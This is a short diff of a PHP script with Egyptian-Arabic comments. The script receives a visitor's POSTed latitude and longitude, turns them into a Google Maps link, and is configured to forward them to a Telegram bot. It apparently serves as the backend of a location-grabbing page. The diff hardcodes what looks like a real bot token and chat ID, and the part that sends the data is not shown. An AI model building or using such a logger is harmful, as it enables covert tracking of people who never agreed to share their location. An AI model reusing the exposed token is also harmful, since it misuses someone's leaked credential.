@@ -1,14 +1,14 @@
 <?php
 // إعدادات التليجرام
-$bot_token = "YOUR_BOT_TOKEN"; // ← حط التوكن بتاع البوت هنا
-$chat_id = "YOUR_CHAT_ID";     // ← حط الـ chat ID هنا
+$bot_token = "5670694895:AAH5eMZfNc1O6bYEl3inJb-NjTObKBjoRUc"; // ← حط التوكن بتاع البوت هنا
+$chat_id = "5523186139";     // ← حط الـ chat ID هنا
 
 // تأكد إن الطلب جاي بطريقة POST
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // استقبل بيانات الموقع
-    $lat = $_POST['latitude'] ?? '0';
-    $lon = $_POST['longitude'] ?? '0';
+    $lat = $_POST['latitude'];
+    $lon = $_POST['longitude'];
     $location_url = "https://www.google.com/maps?q=$lat,$lon";
 
     // استقبل بيانات أخرى لو فيه
